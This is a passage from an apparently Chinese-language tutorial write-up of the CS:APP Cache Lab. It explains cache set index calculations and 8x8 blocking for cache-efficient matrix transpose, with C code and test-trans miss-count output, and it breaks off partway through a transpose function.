</span><span id=__span-130-15><a id=__codelineno-130-15 name=__codelineno-130-15></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>5</span>,1,5<span class=o>)</span><span class=w>    </span><span class=m>231</span><span class=w>       </span><span class=m>7</span><span class=w>       </span><span class=m>0</span><span class=w>     </span><span class=m>231</span><span class=w>       </span><span class=m>7</span><span class=w>       </span><span class=m>0</span><span class=w>  </span>traces/trans.trace
</span><span id=__span-130-16><a id=__codelineno-130-16 name=__codelineno-130-16></a><span class=w>     </span><span class=m>6</span><span class=w> </span><span class=o>(</span><span class=m>5</span>,1,5<span class=o>)</span><span class=w> </span><span class=m>265189</span><span class=w>   </span><span class=m>21775</span><span class=w>   </span><span class=m>21743</span><span class=w>  </span><span class=m>265189</span><span class=w>   </span><span class=m>21775</span><span class=w>   </span><span class=m>21743</span><span class=w>  </span>traces/long.trace
</span><span id=__span-130-17><a id=__codelineno-130-17 name=__codelineno-130-17></a><span class=w>     </span><span class=m>27</span>
</span><span id=__span-130-18><a id=__codelineno-130-18 name=__codelineno-130-18></a>
</span><span id=__span-130-19><a id=__codelineno-130-19 name=__codelineno-130-19></a><span class=nv>TEST_CSIM_RESULTS</span><span class=o>=</span><span class=m>27</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=part-b-optimizing-matrix-transpose>Part B: Optimizing Matrix Transpose<a class=headerlink href=#part-b-optimizing-matrix-transpose title="Permanent link">¶</a></h3> <p>Part B 是在<code>trans.c</code>中编写矩阵转置的函数，在一个 <code>s = 5, E = 1, b = 5</code> 的缓存中进行读写，使得 miss 的次数最少。测试矩阵的参数以及 miss 次数对应的分数如下：</p> <ul> <li>32 x 32: 8 points if m &lt; 300, 0 points if m &gt; 600</li> <li>64 x 64: 8 points if m &lt; 1300, 0 points if m &gt; 2000</li> <li>61 x 67: 10 points if m &lt; 2000, 0 points if m &gt; 3000</li> </ul> <p>要求最多只能声明12个本地变量，这里使用<strong>矩阵分块</strong>进行优化。</p> <h4 id=32-x-32>32 x 32<a class=headerlink href=#32-x-32 title="Permanent link">¶</a></h4> <p>我们先了解下题目给出的 cache 结构：<code>s = 5, E = 1, b = 5</code> 的缓存有32组，每组一行，每行存 8 个int，共 1KB 大小，如图：</p> <p><img alt="alt text" src=../../img/image-98.png width=250></p> <p>以这个缓存为例，考虑暴力转置的做法：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-131-1> 1</a></span>
<span class=normal><a href=#__codelineno-131-2> 2</a></span>
<span class=normal><a href=#__codelineno-131-3> 3</a></span>
<span class=normal><a href=#__codelineno-131-4> 4</a></span>
<span class=normal><a href=#__codelineno-131-5> 5</a></span>
<span class=normal><a href=#__codelineno-131-6> 6</a></span>
<span class=normal><a href=#__codelineno-131-7> 7</a></span>
<span class=normal><a href=#__codelineno-131-8> 8</a></span>
<span class=normal><a href=#__codelineno-131-9> 9</a></span>
<span class=normal><a href=#__codelineno-131-10>10</a></span>
<span class=normal><a href=#__codelineno-131-11>11</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-131-1><a id=__codelineno-131-1 name=__codelineno-131-1></a><span class=kt>void</span><span class=w> </span><span class=nf>trans_submit</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>M</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>N</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>N</span><span class=p>][</span><span class=n>M</span><span class=p>],</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>M</span><span class=p>][</span><span class=n>N</span><span class=p>])</span><span class=w> </span>
</span><span id=__span-131-2><a id=__codelineno-131-2 name=__codelineno-131-2></a><span class=p>{</span>
</span><span id=__span-131-3><a id=__codelineno-131-3 name=__codelineno-131-3></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>N</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-131-4><a id=__codelineno-131-4 name=__codelineno-131-4></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-131-5><a id=__codelineno-131-5 name=__codelineno-131-5></a><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>M</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=o>++</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-131-6><a id=__codelineno-131-6 name=__codelineno-131-6></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-131-7><a id=__codelineno-131-7 name=__codelineno-131-7></a><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>tmp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>];</span>
</span><span id=__span-131-8><a id=__codelineno-131-8 name=__codelineno-131-8></a><span class=w>            </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tmp</span><span class=p>;</span>
</span><span id=__span-131-9><a id=__codelineno-131-9 name=__codelineno-131-9></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-131-10><a id=__codelineno-131-10 name=__codelineno-131-10></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-131-11><a id=__codelineno-131-11 name=__codelineno-131-11></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p><img alt="alt text" src=../../img/image-99.png></p> <p>这里我们会按行优先读取 A 矩阵，然后一列一列地写入 B 矩阵。以第1行为例，在从内存读 A[0][0] 的时候，除了 A[0][0] 被加载到缓存中，它之后的 A[0][1] ~ A[0][7] 也会被加载进缓存。但是内容写入 B 矩阵的时候是一列一列地写入，在列上相邻的元素不在一个内存块上，这样每次写入都不命中缓存。并且一列写完之后再返回，原来的缓存可能被覆盖了，这样就又会不命中，我们来定量分析。</p> <p>cache 只够存储一个矩阵的四分之一，A中的元素每隔8行所对应的cache line位置都是相同的。这里回顾下缓存组索引的计算：</p> <p>在直接映射缓存中，缓存组索引 = (内存地址 ÷ 块大小) % 缓存组数量</p> <p>假设：</p> <ul> <li>矩阵A的起始地址为0</li> <li>矩阵B的起始地址为A矩阵之后，即4096字节(32×32×4)</li> </ul> <p>计算A[i][j]的内存地址和缓存组索引：</p> <ul> <li>A[i][j]的内存地址 = 0 + i×128 + j×4</li> <li>块号 = 地址 ÷ 32 = (i×128 + j×4) ÷ 32 = i×4 + j/8</li> <li>缓存组索引 = 块号 % 32 = <strong>(i×4 + j/8) % 32</strong></li> </ul> <p>计算B[j][i]的内存地址和缓存组索引：</p> <ul> <li>B[j][i]的内存地址 = 4096 + j×128 + i×4</li> <li>块号 = 地址 ÷ 32 = (4096 + j×128 + i×4) ÷ 32 = 128 + j×4 + i/8</li> <li>缓存组索引 = 块号 % 32 = (128 + j×4 + i/8) % 32 = <strong>(j×4 + i/8) % 32</strong></li> </ul> <p>具体例子：</p> <p>取i=0, j=0：</p> <ul> <li>A[0][0]：缓存组索引 = (0×4 + 0) % 32 = 0</li> <li>B[0][0]：缓存组索引 = (0×4 + 0) % 32 = 0</li> </ul> <p>取i=1, j=2：</p> <ul> <li>A[1][2]：缓存组索引 = (1×4 + 2/8) % 32 = 4 % 32 = 4</li> <li>B[2][1]：缓存组索引 = (2×4 + 1/8) % 32 = 8 % 32 = 8</li> </ul> <p>关键发现：当j == i时，A[i][j]和B[j][i]会映射到相同的缓存组！比如i = 0, j = 0；i = 1, j = 1时。因此在访问A[i][j]和B[j][i]时，这就导致了缓存冲突：刚加载A的数据，就被B的数据替换出去。</p> <p>对于A，每8个int就会占满缓存的一组，所以每一行会有 32/8 = 4 次不命中；而对于B，考虑最坏情况，每一列都有 32 次不命中，由此，算出总不命中次数为 4 × 32 + 32 × 32 = 1152。拿程序跑一下：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-132-1> 1</a></span>
<span class=normal><a href=#__codelineno-132-2> 2</a></span>
<span class=normal><a href=#__codelineno-132-3> 3</a></span>
<span class=normal><a href=#__codelineno-132-4> 4</a></span>
<span class=normal><a href=#__codelineno-132-5> 5</a></span>
<span class=normal><a href=#__codelineno-132-6> 6</a></span>
<span class=normal><a href=#__codelineno-132-7> 7</a></span>
<span class=normal><a href=#__codelineno-132-8> 8</a></span>
<span class=normal><a href=#__codelineno-132-9> 9</a></span>
<span class=normal><a href=#__codelineno-132-10>10</a></span>
<span class=normal><a href=#__codelineno-132-11>11</a></span>
<span class=normal><a href=#__codelineno-132-12>12</a></span>
<span class=normal><a href=#__codelineno-132-13>13</a></span>
<span class=normal><a href=#__codelineno-132-14>14</a></span>
<span class=normal><a href=#__codelineno-132-15>15</a></span>
<span class=normal><a href=#__codelineno-132-16>16</a></span>
<span class=normal><a href=#__codelineno-132-17>17</a></span>
<span class=normal><a href=#__codelineno-132-18>18</a></span>
<span class=normal><a href=#__codelineno-132-19>19</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-132-1><a id=__codelineno-132-1 name=__codelineno-132-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>32</span><span class=w> </span>-N<span class=w> </span><span class=m>32</span>
</span><span id=__span-132-2><a id=__codelineno-132-2 name=__codelineno-132-2></a><span class=c1># Generate a handin tar file each time you compile</span>
</span><span id=__span-132-3><a id=__codelineno-132-3 name=__codelineno-132-3></a>tar<span class=w> </span>-cvf<span class=w> </span>lingyu-handin.tar<span class=w>  </span>csim.c<span class=w> </span>trans.c<span class=w> </span>
</span><span id=__span-132-4><a id=__codelineno-132-4 name=__codelineno-132-4></a>csim.c
</span><span id=__span-132-5><a id=__codelineno-132-5 name=__codelineno-132-5></a>trans.c
</span><span id=__span-132-6><a id=__codelineno-132-6 name=__codelineno-132-6></a>
</span><span id=__span-132-7><a id=__codelineno-132-7 name=__codelineno-132-7></a>Function<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-132-8><a id=__codelineno-132-8 name=__codelineno-132-8></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-132-9><a id=__codelineno-132-9 name=__codelineno-132-9></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-132-10><a id=__codelineno-132-10 name=__codelineno-132-10></a>func<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span>Transpose<span class=w> </span>submission<span class=o>)</span>:<span class=w> </span>hits:869,<span class=w> </span>misses:1184,<span class=w> </span>evictions:1152
</span><span id=__span-132-11><a id=__codelineno-132-11 name=__codelineno-132-11></a>
</span><span id=__span-132-12><a id=__codelineno-132-12 name=__codelineno-132-12></a>Function<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-132-13><a id=__codelineno-132-13 name=__codelineno-132-13></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-132-14><a id=__codelineno-132-14 name=__codelineno-132-14></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-132-15><a id=__codelineno-132-15 name=__codelineno-132-15></a>func<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>Simple<span class=w> </span>row-wise<span class=w> </span>scan<span class=w> </span>transpose<span class=o>)</span>:<span class=w> </span>hits:869,<span class=w> </span>misses:1184,<span class=w> </span>evictions:1152
</span><span id=__span-132-16><a id=__codelineno-132-16 name=__codelineno-132-16></a>
</span><span id=__span-132-17><a id=__codelineno-132-17 name=__codelineno-132-17></a>Summary<span class=w> </span><span class=k>for</span><span class=w> </span>official<span class=w> </span>submission<span class=w> </span><span class=o>(</span>func<span class=w> </span><span class=m>0</span><span class=o>)</span>:<span class=w> </span><span class=nv>correctness</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>misses</span><span class=o>=</span><span class=m>1184</span>
</span><span id=__span-132-18><a id=__codelineno-132-18 name=__codelineno-132-18></a>
</span><span id=__span-132-19><a id=__codelineno-132-19 name=__codelineno-132-19></a><span class=nv>TEST_TRANS_RESULTS</span><span class=o>=</span><span class=m>1</span>:1184
</span></code></pre></div></td></tr></table></div> <p>结果为 1184 比预估多了一点，这是对角线部分两者冲突造成的。回过头来，思考暴力做法：</p> <p><img alt="alt text" src=../../img/image-100.png></p> <p>在写入B的前 8 行后，B的D区域就全部进入了缓存，此时如果能对D进行操作，那么就能利用上缓存的内容，不会miss；但是，暴力解法接下来操作的是C，每一个元素的写都要驱逐之前的缓存区，当来到第 2 列继续写D时，它对应的缓存行很可能已经被驱逐了，于是又要miss，也就是说，暴力解法的问题在于没有充分利用上已经进入缓存的元素。</p> <p>由上述分析，显然应考虑 8 × 8 分块，这样在块的内部不会冲突，接下来判断A与B之间会不会冲突：</p> <p><img alt="alt text" src=../../img/image-101.png></p> <p><img alt="alt text" src=../../img/image-102.png></p> <p>A中标深红的块占用的是缓存的第 0，4，8，12，16，20，24，28组，而B中标深红的块占用的是缓存的第2，6，10，14，18，16，30组，刚好不会冲突（即上图中的灰色和淡蓝色对应到右边的cache的位置，注意回顾上述的cache的组索引计算方式，对于A而言，访问到灰色块时，对应的行数是第16~23行，它对应在cache里是第 0，4，8，12，16，20，24，28组。对于B而言，此时访问的是淡蓝色块，对应的行数是第0行，列数是第16~23列，它对应在cache里是第2，6，10，14，18，16，30组。用的都是公式(i×4 + j/8) % 32来计算，i代表行，j代表列）。事实上，除了对角线，A与B中对应的块都不会冲突。所以，我们的想法是可行的，写出代码：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-133-1>1</a></span>
<span class=normal><a href=#__codelineno-133-2>2</a></span>
<span class=normal><a href=#__codelineno-133-3>3</a></span>
<span class=normal><a href=#__codelineno-133-4>4</a></span>
<span class=normal><a href=#__codelineno-133-5>5</a></span>
<span class=normal><a href=#__codelineno-133-6>6</a></span>
<span class=normal><a href=#__codelineno-133-7>7</a></span>
<span class=normal><a href=#__codelineno-133-8>8</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-133-1><a id=__codelineno-133-1 name=__codelineno-133-1></a><span class=kt>void</span><span class=w> </span><span class=nf>transpose_submit</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>M</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>N</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>N</span><span class=p>][</span><span class=n>M</span><span class=p>],</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>M</span><span class=p>][</span><span class=n>N</span><span class=p>])</span>
</span><span id=__span-133-2><a id=__codelineno-133-2 name=__codelineno-133-2></a><span class=p>{</span>
</span><span id=__span-133-3><a id=__codelineno-133-3 name=__codelineno-133-3></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>N</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>8</span><span class=p>)</span>
</span><span id=__span-133-4><a id=__codelineno-133-4 name=__codelineno-133-4></a><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>M</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>8</span><span class=p>)</span>
</span><span id=__span-133-5><a id=__codelineno-133-5 name=__codelineno-133-5></a><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>8</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-133-6><a id=__codelineno-133-6 name=__codelineno-133-6></a><span class=w>                </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>8</span><span class=p>;</span><span class=w> </span><span class=n>s</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-133-7><a id=__codelineno-133-7 name=__codelineno-133-7></a><span class=w>                    </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>s</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>s</span><span class=p>];</span>
</span><span id=__span-133-8><a id=__codelineno-133-8 name=__codelineno-133-8></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>对于A中每一个操作块，只有每一行的第一个元素会不命中，所以为8次不命中；对于B中每一个操作块，只有每一列的第一个元素会不命中，所以也为 8 次不命中。总共miss次数为：8 × 16 + 8 × 16 = 256，然而测试结果是miss次数为344:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-134-1> 1</a></span>
<span class=normal><a href=#__codelineno-134-2> 2</a></span>
<span class=normal><a href=#__codelineno-134-3> 3</a></span>
<span class=normal><a href=#__codelineno-134-4> 4</a></span>
<span class=normal><a href=#__codelineno-134-5> 5</a></span>
<span class=normal><a href=#__codelineno-134-6> 6</a></span>
<span class=normal><a href=#__codelineno-134-7> 7</a></span>
<span class=normal><a href=#__codelineno-134-8> 8</a></span>
<span class=normal><a href=#__codelineno-134-9> 9</a></span>
<span class=normal><a href=#__codelineno-134-10>10</a></span>
<span class=normal><a href=#__codelineno-134-11>11</a></span>
<span class=normal><a href=#__codelineno-134-12>12</a></span>
<span class=normal><a href=#__codelineno-134-13>13</a></span>
<span class=normal><a href=#__codelineno-134-14>14</a></span>
<span class=normal><a href=#__codelineno-134-15>15</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-134-1><a id=__codelineno-134-1 name=__codelineno-134-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>32</span><span class=w> </span>-N<span class=w> </span><span class=m>32</span>
</span><span id=__span-134-2><a id=__codelineno-134-2 name=__codelineno-134-2></a>...
</span><span id=__span-134-3><a id=__codelineno-134-3 name=__codelineno-134-3></a>Function<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-134-4><a id=__codelineno-134-4 name=__codelineno-134-4></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-134-5><a id=__codelineno-134-5 name=__codelineno-134-5></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-134-6><a id=__codelineno-134-6 name=__codelineno-134-6></a>func<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span>Transpose<span class=w> </span>submission<span class=o>)</span>:<span class=w> </span>hits:1709,<span class=w> </span>misses:344,<span class=w> </span>evictions:312
</span><span id=__span-134-7><a id=__codelineno-134-7 name=__codelineno-134-7></a>
</span><span id=__span-134-8><a id=__codelineno-134-8 name=__codelineno-134-8></a>Function<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-134-9><a id=__codelineno-134-9 name=__codelineno-134-9></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-134-10><a id=__codelineno-134-10 name=__codelineno-134-10></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-134-11><a id=__codelineno-134-11 name=__codelineno-134-11></a>func<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>Simple<span class=w> </span>row-wise<span class=w> </span>scan<span class=w> </span>transpose<span class=o>)</span>:<span class=w> </span>hits:869,<span class=w> </span>misses:1184,<span class=w> </span>evictions:1152
</span><span id=__span-134-12><a id=__codelineno-134-12 name=__codelineno-134-12></a>
</span><span id=__span-134-13><a id=__codelineno-134-13 name=__codelineno-134-13></a>Summary<span class=w> </span><span class=k>for</span><span class=w> </span>official<span class=w> </span>submission<span class=w> </span><span class=o>(</span>func<span class=w> </span><span class=m>0</span><span class=o>)</span>:<span class=w> </span><span class=nv>correctness</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>misses</span><span class=o>=</span><span class=m>344</span>
</span><span id=__span-134-14><a id=__codelineno-134-14 name=__codelineno-134-14></a>
</span><span id=__span-134-15><a id=__codelineno-134-15 name=__codelineno-134-15></a><span class=nv>TEST_TRANS_RESULTS</span><span class=o>=</span><span class=m>1</span>:344
</span></code></pre></div></td></tr></table></div> <p>这与我们计算的结果差距非常大，没有得到满分，这是为什么呢？这就要考虑到对角线上的块了。A与B对角线上的块在缓存中对应的位置是相同的，而它们在转置过程中位置不变，所以复制过程中会发生相互冲突。以A的一个对角线块p，B与p相应的对角线块q为例，复制前，p 在缓存中。复制时，q会驱逐p。下一个开始复制 p 又被重新加载进入缓存驱逐 q，这样就会多产生两次miss。</p> <p>如何解决这种问题呢？考虑使用 8 个本地变量一次性存下 A 的一行后，再复制给 B，代码如下：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-135-1> 1</a></span>
<span class=normal><a href=#__codelineno-135-2> 2</a></span>
<span class=normal><a href=#__codelineno-135-3> 3</a></span>
<span class=normal><a href=#__codelineno-135-4> 4</a></span>
<span class=normal><a href=#__codelineno-135-5> 5</a></span>
<span class=normal><a href=#__codelineno-135-6> 6</a></span>
<span class=normal><a href=#__codelineno-135-7> 7</a></span>
<span class=normal><a href=#__codelineno-135-8> 8</a></span>
<span class=normal><a href=#__codelineno-135-9> 9</a></span>
<span class=normal><a href=#__codelineno-135-10>10</a></span>
<span class=normal><a href=#__codelineno-135-11>11</a></span>
<span class=normal><a href=#__codelineno-135-12>12</a></span>
<span class=normal><a href=#__codelineno-135-13>13</a></span>
<span class=normal><a href=#__codelineno-135-14>14</a></span>
<span class=normal><a href=#__codelineno-135-15>15</a></span>
<span class=normal><a href=#__codelineno-135-16>16</a></span>
<span class=normal><a href=#__codelineno-135-17>17</a></span>
<span class=normal><a href=#__codelineno-135-18>18</a></span>
<span class=normal><a href=#__codelineno-135-19>19</a></span>
<span class=normal><a href=#__codelineno-135-20>20</a></span>
<span class=normal><a href=#__codelineno-135-21>21</a></span>
<span class=normal><a href=#__codelineno-135-22>22</a></span>
<span class=normal><a href=#__codelineno-135-23>23</a></span>
<span class=normal><a href=#__codelineno-135-24>24</a></span>
<span class=normal><a href=#__codelineno-135-25>25</a></span>
<span class=normal><a href=#__codelineno-135-26>26</a></span>
<span class=normal><a href=#__codelineno-135-27>27</a></span>
<span class=normal><a href=#__codelineno-135-28>28</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-135-1><a id=__codelineno-135-1 name=__codelineno-135-1></a><span class=kt>void</span><span class=w> </span><span class=nf>transpose_32x32</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>M</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>N</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>N</span><span class=p>][</span><span class=n>M</span><span class=p>],</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>M</span><span class=p>][</span><span class=n>N</span><span class=p>])</span>
</span><span id=__span-135-2><a id=__codelineno-135-2 name=__codelineno-135-2></a><span class=p>{</span>
</span><span id=__span-135-3><a id=__codelineno-135-3 name=__codelineno-135-3></a><span class=w>    </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>32</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>8</span><span class=p>)</span>
</span><span id=__span-135-4><a id=__codelineno-135-4 name=__codelineno-135-4></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-135-5><a id=__codelineno-135-5 name=__codelineno-135-5></a><span class=w>        </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>32</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>8</span><span class=p>)</span>
</span><span id=__span-135-6><a id=__codelineno-135-6 name=__codelineno-135-6></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-135-7><a id=__codelineno-135-7 name=__codelineno-135-7></a><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>8</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-135-8><a id=__codelineno-135-8 name=__codelineno-135-8></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-135-9><a id=__codelineno-135-9 name=__codelineno-135-9></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=p>];</span>
